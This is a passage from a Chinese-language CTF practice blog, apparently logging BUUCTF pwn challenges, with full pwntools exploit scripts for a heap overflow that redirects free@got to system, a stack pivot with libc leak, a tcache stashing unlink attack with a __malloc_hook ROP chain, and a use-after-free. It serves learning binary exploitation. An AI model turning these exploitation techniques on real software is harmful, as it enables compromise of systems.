class="number">0x10</span>)+p64(heap_array-<span class="number">0x10</span>+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(<span class="number">0x40</span>)</span><br><span class="line">pal2=p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,pal2)</span><br><span class="line">edit(<span class="number">2</span>,pal1)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#2 为0x6020d8</span></span><br><span class="line">edit(<span class="number">2</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>])*<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#edit(0,b&#x27;10000000&#x27;)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里最有病的就是后门仅仅是提供一个system的符号表。</p><h3 id="二解-1"><a href="#二解-1" class="headerlink" title="二解"></a>二解</h3><p>​先申请3个堆块，index分别为0，1，2，然后释放chunk2，接着edit chunk1溢出,修改chunk1数据为&#x2F;bin&#x2F;sh(因为后面要delete chunk1 getshell)修改chunk2的fd为一处与heaparray数组接近的地方，因为这里可以错位偏移构造一个size为0x7f的fake_chunk，绕过malloc对fastbin chunk的检查，让它插进fastbins ，之后从新申请回fake_chunk，利用fake_chunk溢出修改heaparray[0]的值为free_got,最后edit chunk0(现在为free_got)为system_plt,然后delete(1)执行system(“&#x2F;bin&#x2F;sh”) getshell</p><p>​跟0ctf那题有异曲同工之妙，就是构造fake_fastbin</p><h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>首先本道题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vul_function();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodBye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在大多数操作系统中，BSS 段的权限通常是可读写（RW）的，但不可执行（E）。</p><p>所以显然就是栈迁移，有地方让我们写，然后到main里让我们得以凑齐两个leave_ret，从而可以实施</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment">#sh=process(&quot;spwn&quot;)</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26209</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;spwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main=<span class="number">0x08048513</span></span><br><span class="line">s_addr=<span class="number">0x0804A300</span></span><br><span class="line">leave_ret=<span class="number">0x08048511</span></span><br><span class="line">ret_addr=<span class="number">0x08048312</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload1=p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">sh.send(payload1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+p32(s_addr-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">write_addr=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_addr=&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=LibcSearcher(&quot;write&quot;,write_addr)</span></span><br><span class="line"><span class="comment">#libc_base=write_addr-libc.dump(&quot;write&quot;)</span></span><br><span class="line"><span class="comment">#print(&quot;libc_base=&quot;,end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line">libcbase = write_addr - <span class="number">0x0d43c0</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x3a940</span></span><br><span class="line">binsh = libcbase + <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload3=p32(ret_addr)+p32(system_addr)+p32(main)+p32(binsh)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这道题让我感觉很奇怪，因为我用libcsearcher找的libc不能用，但是我用网上找的偏移确实正确的</p><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p>这道题用的是int 80的系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int80(<span class="number">11</span>,<span class="string">&quot;/bin/sh&quot;</span>,null,null)</span><br></pre></td></tr></table></figure><p>　　后面的四个参数分别是<strong>eax</strong>、<strong>ebx</strong>、<strong>ecx</strong>、<strong>edx</strong>。</p><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>改堆的free函数为system@plt，然后再改内容为&#x2F;sh，应该是可以getshell的，但是不知道为什么调试一直显示共享库损坏，就不写了</p><p>strchr寻找字符出现的地方</p><h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>首先是一个off-by-null的漏洞</p><p>那么应该是一个unlink然后通过unlink后的堆块，来改一个结构堆块的内容为free@got，之后改这个内容的内容堆块，即改free@go表为system然后再传入一个&#x2F;bin&#x2F;sh\x00就行了</p><p>但是我看了wp，发现我的思路有点过于复杂了，他的des的大小判断是根据堆块越界来看的，我们可以不让结构堆块和des堆块连在一起，就能实现越界到另一个结构堆块上</p><p>可以通过show函数来泄露libc基址，就越界覆盖一个free@got来show</p><h2 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a>hitcon_ctf_2019_one_punch</h2><p>冷知识：calloc不会从tcachebin里面取堆块</p><p>​首先大概的思路是先泄露libc基址，这个可以通过show unsortedbin来泄露，再泄露heap基址，之后便是构造<code>tcache stashing unlink attack</code>，之后再修改<code>__malloc_hook</code>为add rsp###,ret然后在栈中构造ROP链</p><p>​仔细说一下tcache的unlink attack，它是先申请相同size的两个smallbin和tcachebin，然后再用calloc拿掉一个smallbin的时候会将剩下的smallbin放进tcachebin里，而且其中几乎没有什么check，那么我们就可以在拿取之前将smallbin的bk改成目标地址，但是要保证fd链是正确的，就可以在target-0x10上覆盖一个地址，算是大数组，也可以字节错位来实现一些小目标</p><h3 id="首先这题有几个问题"><a href="#首先这题有几个问题" class="headerlink" title="首先这题有几个问题"></a>首先这题有几个问题</h3><h3 id="magic函数的判定寻找过程"><a href="#magic函数的判定寻找过程" class="headerlink" title="magic函数的判定寻找过程"></a>magic函数的判定寻找过程</h3><p>首先是<code>qword_4030</code>是位于bss段上的，那么vmmap上找第一个RW段，就是bss段，然后以基址往后30就是该值，之后+0x20即在这个地址上的值加上0x20</p><h3 id="还有tcache结构堆块的结构"><a href="#还有tcache结构堆块的结构" class="headerlink" title="还有tcache结构堆块的结构"></a>还有tcache结构堆块的结构</h3><p>tcache结构是第一个malloc或calloc的堆块的时候初始化形成的，首先是couts数组，然后才是tcache堆，而这个couts的存储大小有1字节和2字节之分，区分于版本的大小，在较低版本都是1字节，较高版本是2字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">sh=process(<span class="string">&#x27;./2019_one_punch&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:sh.sendlineafter(x,y)</span><br><span class="line">sa  = <span class="keyword">lambda</span> x,y:sh.sendafter(x,y)</span><br><span class="line">su  = <span class="keyword">lambda</span> x  :sh.recvuntil(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x  :sh.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>(<span class="params">content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;50086&#x27;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx=<span class="built_in">int</span>,size=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;hero name: &#x27;</span>,size*content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename</span>(<span class="params">idx=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;hero name: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;50056&#x27;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">recvdata2=u64(sh.recv()[<span class="number">11</span>:][:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=recvdata2 &amp; <span class="number">0xFFFFFFFFF000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base_addr======&gt;&quot;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;hero name: &#x27;</span>)</span><br><span class="line">recvdata1=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">main_arena_addr=recvdata1-<span class="number">96</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mainarena==========&gt;&quot;</span>,<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_base=main_arena_addr-<span class="number">0x1ECB80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr==========&gt;&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#-------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">1</span>)    <span class="comment">##改这个的bk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#-------------------------------------------</span></span><br><span class="line">fd=heap_base+<span class="number">0x31C0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fd==&gt;&quot;</span>,fd)</span><br><span class="line">fake_bk=heap_base+<span class="number">0x30</span>-<span class="number">0x10</span>-<span class="number">5</span></span><br><span class="line">pal=<span class="number">0x300</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(fd)+p64(fake_bk)</span><br><span class="line">rename(<span class="number">1</span>,pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#------------------------------------------</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x217</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">malloc_hook=main_arena_addr-<span class="number">0x10</span></span><br><span class="line">rename(<span class="number">0</span>,p64(malloc_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">b&#x27;a&#x27;</span>)     <span class="comment">##要先放到tcache才能改tcache的数量，不然放不进去，然后再magic</span></span><br><span class="line">debug()</span><br><span class="line">magic(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">magic(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">magic_gadget = libc_base+<span class="number">0x000000000008cfd6</span></span><br><span class="line">payload = p64(magic_gadget)</span><br><span class="line">magic(payload) <span class="comment"># __malloc_hook --&gt; gadget(add rsp,0x48)</span></span><br><span class="line"></span><br><span class="line">p_rdi = libc_base + <span class="number">0x0000000000026542</span></span><br><span class="line">p_rsi = libc_base + <span class="number">0x0000000000026f9e</span></span><br><span class="line">p_rdx = libc_base + <span class="number">0x000000000012bda6</span></span><br><span class="line">p_rax = libc_base + <span class="number">0x0000000000047cf8</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000cf6c5</span></span><br><span class="line">rop_heap = heap_base + <span class="number">0x44b0</span> <span class="comment"># &#x27;./flag&#x27; </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bad syscall</span></span><br><span class="line"><span class="comment"># rops = p64(p_rdi)+p64(rop_heap) + p64(p_rsi)+p64(0)</span></span><br><span class="line"><span class="comment"># rops += p64(libc.sym[&#x27;open&#x27;]+libc_base)</span></span><br><span class="line"><span class="comment"># rops += p64(p_rdi)+p64(3)+p64(p_rsi)+p64(heap_base+0x260)+p64(p_rdx)+p64(0x70)</span></span><br><span class="line"><span class="comment"># rops += p64(libc.sym[&#x27;read&#x27;]+libc_base)</span></span><br><span class="line"><span class="comment"># rops += p64(p_rdi)+p64(1)+p64(p_rsi)+p64(heap_base+0x260)+p64(p_rdx)+p64(0x70)</span></span><br><span class="line"><span class="comment"># rops += p64(libc.sym[&#x27;write&#x27;]+libc_base)</span></span><br><span class="line"></span><br><span class="line">rops = p64(p_rdi)+p64(rop_heap)</span><br><span class="line">rops += p64(p_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(p_rdx)+p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(p_rax)+p64(<span class="number">2</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"><span class="comment">#rops += p64(libc.sym[&#x27;open&#x27;])</span></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rops += p64(p_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">rops += p64(p_rsi)+p64(heap_base+<span class="number">0x260</span>)</span><br><span class="line">rops += p64(p_rdx)+p64(<span class="number">0x70</span>)</span><br><span class="line">rops += p64(p_rax)+p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"><span class="comment">#rops += p64(libc.sym[&#x27;read&#x27;])</span></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rops += p64(p_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">rops += p64(p_rsi)+p64(heap_base+<span class="number">0x260</span>)</span><br><span class="line">rops += p64(p_rdx)+p64(<span class="number">0x70</span>)</span><br><span class="line">rops += p64(p_rax)+p64(<span class="number">1</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbs(&quot;b *__malloc_hook&quot;)</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;hero name: &#x27;</span>,rops)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="metasequoia-2020-summoner"><a href="#metasequoia-2020-summoner" class="headerlink" title="metasequoia_2020_summoner"></a>metasequoia_2020_summoner</h2><p>本题其实只是一个纸老虎<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211053.png" alt="image-20240311224248322"></p><p>这便是题目的大意</p><p>但是他在free的时候free的其实是存储name的堆块，因此就很好构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29952</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">s</span>):</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">sh.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">summon</span>(<span class="params">name</span>):</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;summon &#x27;</span> + name)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release</span>():</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;release&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Released.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strike</span>():</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;strike&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">summon(fake)</span><br><span class="line">release()</span><br><span class="line">summon(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">strike()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;buu做题记录1&quot;&gt;&lt;a href=&quot;#buu做题记录1&quot; class=&quot;headerlink&quot; title=&quot;buu做题记录1&quot;&gt;&lt;/a&gt;buu做题记录1&lt;/h1&gt;&lt;p&gt;算是最近得做题记录了，就是一开始的比较简单呃就挺简洁的，所以后面跳到5，6页了，算是总结吧，</summary>
      
    
    
    
